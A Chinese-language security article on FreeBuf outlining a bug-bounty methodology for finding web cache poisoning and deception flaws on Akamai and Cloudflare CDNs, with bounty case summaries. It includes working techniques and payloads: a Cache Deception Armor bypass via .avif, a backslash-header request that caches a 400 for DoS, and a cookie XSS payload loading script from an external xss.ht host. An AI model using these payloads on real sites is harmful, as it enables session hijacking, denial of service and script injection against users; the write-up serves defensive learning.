---
title: Bombon 方法论：我将如何测试Web缓存漏洞
url: https://www.freebuf.com/articles/web/420867.html
source: FreeBuf网络安全行业门户
date: 2025-01-27
fetch_date: 2025-10-06T20:08:23.399876
---

# Bombon 方法论：我将如何测试Web缓存漏洞

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

Bombon 方法论：我将如何测试Web缓存漏洞

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

Bombon 方法论：我将如何测试Web缓存漏洞

2025-01-26 22:20:41

所属地 河南省

> "值得分享的是，我不使用自动化工具来查找这些问题。事实上，我用于一般测试的唯一自动化工具是 SQLmap for SQLi。" ————bombon

## 什么是Web缓存漏洞

Web缓存漏洞是指由于缓存机制配置或实现不当，导致攻击者可通过操纵缓存内容获取敏感信息、篡改数据或破坏服务安全性的安全风险。常见攻击包括**缓存投毒**（注入恶意响应误导用户）、**缓存欺骗**（诱骗缓存存储私密数据）以及**未授权缓存**（泄露本应受限的内容）。防御需严格校验缓存内容、限制敏感数据缓存、设置合理的缓存时间，并通过`Cache-Control`等HTTP头规范缓存行为，避免攻击者利用漏洞危害系统。

```
### 举个形象的例子 ：
假设有一个电商网站，用户登录后可以看到自己的“猜你喜欢”推荐商品列表。这个页面被配置为**缓存10分钟**，但缓存键（Cache Key）设计不当，只根据URL路径（如`/recommendations`）缓存，**没有区分用户身份**。

**攻击过程**：
1. **攻击者登录自己的账号**，访问`/recommendations`，页面显示他的推荐商品（比如“钓鱼装备”）。
2. 服务器将他的推荐页面缓存起来，缓存键是`/recommendations`。
3. **普通用户Alice登录后访问同一个URL**，由于缓存存在，她直接收到攻击者的推荐页面（“钓鱼装备”），而不是自己真实的推荐（比如“化妆品”）。
4. **攻击者甚至可以篡改推荐内容**（例如插入恶意链接或虚假广告），导致所有用户看到被污染的页面。
```

## 方法论

#### 如果应用程序没有登录功能，但使用 Akamai CDN，则我的步骤如下：

1. 抓包发送到Repeater（send to Repeater)![image](https://image.3001.net/images/20250126/1737901023_679643df0b345da6aea70.png!small)
2. 检查服务器是否缓存正常请求（可以通过响应头“Server-Timing: cdn-cache; desc=HIT”来判断）![image](https://image.3001.net/images/20250126/1737901041_679643f11661a53be4865.png!small)
3. 在请求中添加非法请求标头![image](https://image.3001.net/images/20250126/1737901061_679644058c1986997adb9.png!small)
4. 如果响应已成功缓存，当您在任何浏览器上打开 URL 时，您应该会收到 400 Bad Request

#### 如果应用程序确实具有登录功能

1. 创建一个用户
2. 检查请求包里面有没有敏感信息，（如：会话令牌）!![image](https://image.3001.net/images/20250126/1737901087_6796441f1e948f9282c45.png!small)
3. 发送到Repeater
4. 在URL末尾添加可缓存的扩展名（.js，.css），看看是否给出了200 OK的响应
5. 使用您的创建帐户打开修改后的URL!![image](https://image.3001.net/images/20250126/1737901105_67964431abbcd2eaac68e.png!small)
6. 使用curl或私密Private Web浏览器窗口打开相同的URL!![image](https://image.3001.net/images/20250126/1737901123_67964443b4a17a58e6a37.png!small)
7. 如果令牌成功缓存，您应该在响应中看到令牌![image](https://image.3001.net/images/20250126/1737901138_67964452b728c67f85979.png!small)

#### 如果应用程序正在使用Cloudflare CDN

非法Header无法正常工作，现在大多数Cloudflare客户都使用[Cache Deception Armor](https://developers.cloudflare.com/cache/cache-security/cache-deception-armor/)
我能够使用.AVIF文件绕过此保护，这是一个非常未知的扩展文件。
但是，有些站点没有激活此保护，您可以完美测试缓存中毒/欺骗

#### 例子

> **缓存欺骗到账户接管**→赏金 = 1,500 美元

## 概括：

所有 cookie（甚至是 HTTPonly cookie）均在 https://host.com/app/conversation/1.js 中公开。

如果经过身份验证的用户访问此 URL，则其所有 cookie 都将存储在缓存中

然后攻击者可以提取 cookie 并劫持其会话

* 笔记：

有时，如果响应是“404 Not found”，Akamai 只会将响应缓存不到 10 秒，这会使攻击者更难攻击。在这种情况下，攻击者需要快速行动，但是，如果 Akamai 检测到 200 Ok 响应，则响应将持续至少 24 小时。

```
在某些应用程序中，如果你在扩展名前添加分号（;），它可能会给你一个 200 Ok 的响应

例如

/xxx/xxxxxx/;.js

回复

HTTP/2 200 正常
```

> **缓存投毒导致 DoS → 赏金 = 1,000 美元**

## 概括：

在 Akamai CDN 中，如果我们发送反斜杠`\`作为标头，服务器将以 400`Bad Request`响应进行响应
请求

```
GET /products/xxx/xxxx/xxx/?test HTTP/2
Host: www.host.com
\:
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
```

响应

```
HTTP/2 400 Bad RequestContent-Type: text/html;charset=iso-8859-1Content-Length: 70Cache-Control: max-age=297Expires: Thu, 21 Jul 2022 16:17:54 GMTDate: Thu, 21 Jul 2022 16:12:57 GMTServer-Timing: cdn-cache; desc=HITServer-Timing: edge; dur=32Server-Timing: origin; dur=147Strict-Transport-Security: max-age=86400Ak-Uuid: 0.bc85d817.1658419977.1592c61
```

当网站使用缓存服务器时，这就会成为一个问题。网站通常只缓存 javascript、css 和其他文件，但当网站`www.host.com`还缓存正常响应时，例如

www.host.com/products/\*

www.host.com/\*

等等

这将会成为一个影响非常大的错误。

```
Akamai`workaround`针对此漏洞进行了改进，使 400 响应在缓存中仅持续 5 秒，但是，攻击者可以使用 burp 中的入侵者发送空有效载荷，这样相同的 400 响应就会被永久缓存
```

> **缓存中毒到存储型XSS → 赏金 = 1,000 美元**

## 概括：

`n_vis`通过Cookie 参数存在 XSS

由于服务器缓存了此响应，攻击者可以保存 XSS Payload

有一个强大的过滤器（和 WAF）可以阻止大多数有效负载，但由于该网站使用 Jquery，攻击者可以使用该`$.getScript`函数来利用这一点。

请求

```
GET /xxxx/xx-xx.otf?triagethiss HTTP/2
Host: www.host.com
Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-xss,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
```

响应

```
<script>...Visitor.id='xssx'*$.getScript`//593.xss.ht`//;....</script>
```

```
在任何请求标头、Cookie、自定义标头、X-Forwarded-* 标头上测试 XSS
```

本文主要思路来自于bombon 的 How I Test For Web Cache Vulnerabilities + Tips And Tricks

# 漏洞 # web安全 # web缓存 # Web缓存安全

免责声明

1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。

2. 适用性声明：文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。

3. 更新声明：技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

什么是Web缓存漏洞

方法论

概括：

概括：

概括：

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)